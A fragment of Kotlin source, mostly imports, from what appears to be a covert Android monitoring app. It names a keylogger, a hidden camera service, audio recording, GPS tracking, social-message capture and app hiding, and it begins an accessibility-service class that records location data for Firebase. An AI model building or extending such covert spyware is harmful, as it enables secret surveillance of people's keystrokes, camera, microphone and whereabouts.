...
import com.github.midros.istheap.data.model.ChildPhoto
import com.github.midros.istheap.data.model.ChildRecording
import com.github.midros.istheap.data.model.Photo
import com.github.midros.istheap.data.model.Recording
...
import com.github.midros.istheap.utils.ConstFun.getRandomNumeric
import com.github.midros.istheap.utils.ConstFun.showApp
import com.github.midros.istheap.utils.Consts.ADDRESS_AUDIO_RECORD
import com.github.midros.istheap.utils.Consts.CHILD_CAPTURE_PHOTO
import com.github.midros.istheap.utils.Consts.CHILD_GPS
import com.github.midros.istheap.utils.Consts.CHILD_PERMISSION
import com.github.midros.istheap.utils.Consts.CHILD_SERVICE_DATA
import com.github.midros.istheap.utils.Consts.CHILD_SHOW_APP
import com.github.midros.istheap.utils.Consts.CHILD_SOCIAL_MS
import com.github.midros.istheap.utils.Consts.DATA
import com.github.midros.istheap.utils.Consts.INTERVAL
import com.github.midros.istheap.utils.Consts.KEY_LOGGER
import com.github.midros.istheap.utils.Consts.KEY_TEXT
import com.github.midros.istheap.utils.Consts.LOCATION
import com.github.midros.istheap.utils.Consts.PARAMS
import com.github.midros.istheap.utils.Consts.PHOTO
import com.github.midros.istheap.utils.Consts.RECORDING
import com.github.midros.istheap.utils.Consts.SOCIAL
import com.github.midros.istheap.utils.Consts.TAG
import com.github.midros.istheap.utils.Consts.TIMER
import com.github.midros.istheap.utils.FileHelper
import com.github.midros.istheap.utils.FileHelper.getFileNameAudio
import com.github.midros.istheap.utils.FileHelper.getFilePath
import com.github.midros.istheap.utils.MediaRecorderUtils
import com.github.midros.istheap.utils.MyCountDownTimer
import com.github.midros.istheap.utils.hiddenCameraServiceUtils.CameraCallbacks
import com.github.midros.istheap.utils.hiddenCameraServiceUtils.CameraConfig
import com.github.midros.istheap.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE
import com.github.midros.istheap.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION
import com.github.midros.istheap.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_IMAGE_WRITE_FAILED
import com.github.midros.istheap.utils.hiddenCameraServiceUtils.HiddenCameraService
import com.github.midros.istheap.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.github.midros.istheap.utils.hiddenCameraServiceUtils.config.CameraRotation
...
class InteractorAccessibilityData @Inject constructor(private val context: Context, private val firebase: InterfaceFirebase) : InterfaceAccessibility, CameraCallbacks {
    ...
    override fun setDataLocation(location: Location) {
        if (firebase.getUser() != null) {
            ...
            val model = com.github.midros.istheap.data.model.Location(location.latitude, location.longitude, address, getDateTime())
